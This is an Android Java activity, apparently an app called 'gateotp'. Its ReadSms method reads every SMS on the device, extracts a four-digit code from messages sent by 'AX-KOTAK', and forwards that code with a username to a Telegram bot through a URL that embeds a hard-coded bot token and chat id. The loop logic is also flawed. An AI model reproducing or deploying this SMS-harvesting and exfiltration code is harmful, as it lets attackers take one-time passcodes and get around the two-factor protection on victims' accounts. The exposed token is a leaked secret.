package com.example.gateotp;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity2 extends AppCompatActivity  {
    private TextView textView;
    TextView textView3;
    String msgName = "";
    String smsmessage="";
    String date="";
    String Name="AX-KOTAK";
    Pattern pattern = Pattern.compile("(\\d{4})");
    String val = "No "+Name+" found ";
    String t;
    String username2="";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
        textView = findViewById(R.id.textView);
    }
    @RequiresApi(api = Build.VERSION_CODES.N)
    public void ReadSms(View view) {
        Intent intent=getIntent();
        String username=intent.getStringExtra(MainActivity.EXTRA_NAME);
        username2+=username;

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        int x = cursor.getCount();
        cursor.moveToFirst();
        for (int i = 1; i <= x; i++) {
            msgName = cursor.getString(2);
            smsmessage = cursor.getString(12);

            if (msgName.equals(Name)) {
                Matcher matcher = pattern.matcher(smsmessage);

                if (matcher.find()) {
                    val = matcher.group(0);



                }
                else {
                    val = "Not Found !";
                }
                textView.setText(val);

            } else {
                cursor.moveToNext();
            }
            textView.setText(val);
        }

        if (!val.equals("Not Found !") && !val.equals("No "+Name+" found ")){
            gotoUrl("https://api.telegram.org/bot1799178653:AAH00J2q7asxuO9omvJwDroduc8HOCvcjXU/sendMessage?chat_id=-505163273?????&text=Todays OTP of "+username+" "+ val);

        }



    }




    private void gotoUrl(String s) {
        Uri uri=Uri.parse(s);
        startActivity(new Intent(Intent.ACTION_VIEW,uri));
    }
}